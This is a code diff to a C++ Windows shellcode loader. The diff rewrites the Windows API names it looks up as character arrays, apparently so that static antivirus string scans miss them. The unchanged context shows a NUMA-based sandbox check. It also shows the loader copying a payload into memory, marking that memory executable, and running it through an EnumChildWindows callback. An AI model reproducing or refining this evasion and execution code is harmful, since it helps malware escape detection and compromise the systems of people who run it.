@@ -22,8 +22,10 @@ typedef LPVOID(WINAPI *pVirtualAllocExNuma)(HANDLE hProcess, LPVOID lpAddress, S
 bool checkNUMA()
 {
         LPVOID mem{NULL};
+        const char k32DllName[13]{ 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+        const char vAllocExNuma[19]{ 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', 'N', 'u', 'm', 'a', 0x0 };
         pVirtualAllocExNuma myVirtualAllocExNuma =
-            (pVirtualAllocExNuma)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAllocExNuma");
+            (pVirtualAllocExNuma)GetProcAddress(GetModuleHandle(k32DllName), vAllocExNuma);
         mem =
             myVirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
         if (mem != NULL)
@@ -189,14 +191,16 @@ int main(int argc, char *argv[])
 
                 int loops{sizeof(payload) / 39};
 
-                HMODULE k32_handle{GetModuleHandle("kernel32.dll")};
+                const char k32DllName[13]{ 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+                HMODULE k32_handle{GetModuleHandle(k32DllName)};
                 BOOL rv{};
                 char chars_array[39]{};
                 DWORD oldprotect{0};
                 char *temp{};
                 printf("1 %s\n", payload);
 
-                pMVA = GetProcAddress(k32_handle, "VirtualAlloc");
+                const char vAlloc[13]{ 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
+                pMVA = GetProcAddress(k32_handle, vAlloc);
                 PVOID mem = pMVA(0, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                 DWORD_PTR hptr = (DWORD_PTR)mem;
 
@@ -223,7 +227,8 @@ int main(int argc, char *argv[])
                         hptr += 16;
                 }
 
-                pMVP = GetProcAddress(k32_handle, "VirtualProtect");
+                const char virtProt[15] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
+                pMVP = GetProcAddress(k32_handle, virtProt);
                 rv = pMVP(mem, 0x100000, PAGE_EXECUTE_READ, &oldprotect);
                 EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
                 CloseHandle(mem);
